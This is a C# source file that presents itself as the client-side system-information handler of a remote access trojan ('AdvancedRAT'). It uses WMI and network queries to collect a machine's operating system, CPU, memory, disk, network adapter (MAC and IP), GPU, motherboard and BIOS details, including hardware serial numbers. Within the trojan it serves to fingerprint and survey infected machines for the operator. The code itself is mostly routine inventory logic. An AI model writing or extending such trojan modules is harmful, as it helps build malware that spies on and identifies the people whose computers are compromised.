using System;
using System.Threading.Tasks;
using System.Management;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using System.Net.NetworkInformation;

namespace AdvancedRAT.Client.Handlers
{
    public class SystemInfoHandler
    {
        public async Task<object> GetFullSystemInfo()
        {
            try
            {
                var info = new Dictionary<string, object>
                {
                    ["os"] = GetOSInfo(),
                    ["cpu"] = GetCPUInfo(),
                    ["memory"] = GetMemoryInfo(),
                    ["disk"] = GetDiskInfo(),
                    ["network"] = GetNetworkInfo(),
                    ["gpu"] = GetGPUInfo(),
                    ["motherboard"] = GetMotherboardInfo(),
                    ["bios"] = GetBIOSInfo()
                };
                
                return new { success = true, info };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private Dictionary<string, string> GetOSInfo()
        {
            var info = new Dictionary<string, string>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        info["Name"] = obj["Caption"]?.ToString();
                        info["Version"] = obj["Version"]?.ToString();
                        info["Architecture"] = obj["OSArchitecture"]?.ToString();
                        info["BuildNumber"] = obj["BuildNumber"]?.ToString();
                        info["SerialNumber"] = obj["SerialNumber"]?.ToString();
                        info["InstallDate"] = obj["InstallDate"]?.ToString();
                        info["LastBootUpTime"] = obj["LastBootUpTime"]?.ToString();
                        info["SystemDirectory"] = obj["SystemDirectory"]?.ToString();
                        info["WindowsDirectory"] = obj["WindowsDirectory"]?.ToString();
                    }
                }
            }
            catch { }
            
            return info;
        }
        
        private Dictionary<string, string> GetCPUInfo()
        {
            var info = new Dictionary<string, string>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        info["Name"] = obj["Name"]?.ToString();
                        info["Manufacturer"] = obj["Manufacturer"]?.ToString();
                        info["MaxClockSpeed"] = obj["MaxClockSpeed"]?.ToString() + " MHz";
                        info["NumberOfCores"] = obj["NumberOfCores"]?.ToString();
                        info["NumberOfLogicalProcessors"] = obj["NumberOfLogicalProcessors"]?.ToString();
                        info["Architecture"] = obj["Architecture"]?.ToString();
                        info["ProcessorId"] = obj["ProcessorId"]?.ToString();
                        info["L2CacheSize"] = obj["L2CacheSize"]?.ToString() + " KB";
                        info["L3CacheSize"] = obj["L3CacheSize"]?.ToString() + " KB";
                    }
                }
            }
            catch { }
            
            return info;
        }
        
        private Dictionary<string, string> GetMemoryInfo()
        {
            var info = new Dictionary<string, string>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory"))
                {
                    long totalCapacity = 0;
                    int moduleCount = 0;
                    
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        moduleCount++;
                        long capacity = Convert.ToInt64(obj["Capacity"]);
                        totalCapacity += capacity;
                        
                        info[$"Module{moduleCount}_Capacity"] = $"{capacity / (1024 * 1024 * 1024)} GB";
                        info[$"Module{moduleCount}_Speed"] = obj["Speed"]?.ToString() + " MHz";
                        info[$"Module{moduleCount}_Manufacturer"] = obj["Manufacturer"]?.ToString();
                        info[$"Module{moduleCount}_PartNumber"] = obj["PartNumber"]?.ToString();
                    }
                    
                    info["TotalCapacity"] = $"{totalCapacity / (1024 * 1024 * 1024)} GB";
                    info["ModuleCount"] = moduleCount.ToString();
                }
                
                // Available memory
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        long freeMemory = Convert.ToInt64(obj["FreePhysicalMemory"]) * 1024;
                        info["FreeMemory"] = $"{freeMemory / (1024 * 1024 * 1024)} GB";
                    }
                }
            }
            catch { }
            
            return info;
        }
        
        private List<Dictionary<string, string>> GetDiskInfo()
        {
            var disks = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        var disk = new Dictionary<string, string>
                        {
                            ["Model"] = obj["Model"]?.ToString(),
                            ["Size"] = $"{Convert.ToInt64(obj["Size"]) / (1024 * 1024 * 1024)} GB",
                            ["InterfaceType"] = obj["InterfaceType"]?.ToString(),
                            ["SerialNumber"] = obj["SerialNumber"]?.ToString(),
                            ["MediaType"] = obj["MediaType"]?.ToString()
                        };
                        disks.Add(disk);
                    }
                }
                
                // Logical disks
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk WHERE DriveType=3"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        var disk = new Dictionary<string, string>
                        {
                            ["Drive"] = obj["DeviceID"]?.ToString(),
                            ["VolumeName"] = obj["VolumeName"]?.ToString(),
                            ["FileSystem"] = obj["FileSystem"]?.ToString(),
                            ["Size"] = $"{Convert.ToInt64(obj["Size"]) / (1024 * 1024 * 1024)} GB",
                            ["FreeSpace"] = $"{Convert.ToInt64(obj["FreeSpace"]) / (1024 * 1024 * 1024)} GB"
                        };
                        disks.Add(disk);
                    }
                }
            }
            catch { }
            
            return disks;
        }
        
        private List<Dictionary<string, string>> GetNetworkInfo()
        {
            var adapters = new List<Dictionary<string, string>>();
            
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up)
                    {
                        var adapter = new Dictionary<string, string>
                        {
                            ["Name"] = ni.Name,
                            ["Description"] = ni.Description,
                            ["Type"] = ni.NetworkInterfaceType.ToString(),
                            ["Speed"] = $"{ni.Speed / 1000000} Mbps",
                            ["MAC"] = ni.GetPhysicalAddress().ToString(),
                            ["Status"] = ni.OperationalStatus.ToString()
                        };
                        
                        IPInterfaceProperties ipProps = ni.GetIPProperties();
                        var ips = new List<string>();
                        foreach (var ip in ipProps.UnicastAddresses)
                        {
                            ips.Add(ip.Address.ToString());
                        }
                        adapter["IPs"] = string.Join(", ", ips);
                        
                        adapters.Add(adapter);
                    }
                }
            }
            catch { }
            
            return adapters;
        }
        
        private List<Dictionary<string, string>> GetGPUInfo()
        {
            var gpus = new List<Dictionary<string, string>>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        var gpu = new Dictionary<string, string>
                        {
                            ["Name"] = obj["Name"]?.ToString(),
                            ["AdapterRAM"] = $"{Convert.ToInt64(obj["AdapterRAM"]) / (1024 * 1024)} MB",
                            ["DriverVersion"] = obj["DriverVersion"]?.ToString(),
                            ["VideoProcessor"] = obj["VideoProcessor"]?.ToString(),
                            ["CurrentRefreshRate"] = obj["CurrentRefreshRate"]?.ToString() + " Hz",
                            ["VideoModeDescription"] = obj["VideoModeDescription"]?.ToString()
                        };
                        gpus.Add(gpu);
                    }
                }
            }
            catch { }
            
            return gpus;
        }
        
        private Dictionary<string, string> GetMotherboardInfo()
        {
            var info = new Dictionary<string, string>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        info["Manufacturer"] = obj["Manufacturer"]?.ToString();
                        info["Product"] = obj["Product"]?.ToString();
                        info["SerialNumber"] = obj["SerialNumber"]?.ToString();
                        info["Version"] = obj["Version"]?.ToString();
                    }
                }
            }
            catch { }
            
            return info;
        }
        
        private Dictionary<string, string> GetBIOSInfo()
        {
            var info = new Dictionary<string, string>();
            
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        info["Manufacturer"] = obj["Manufacturer"]?.ToString();
                        info["Name"] = obj["Name"]?.ToString();
                        info["SerialNumber"] = obj["SerialNumber"]?.ToString();
                        info["Version"] = obj["Version"]?.ToString();
                        info["ReleaseDate"] = obj["ReleaseDate"]?.ToString();
                    }
                }
            }
            catch { }
            
            return info;
        }
    }
}
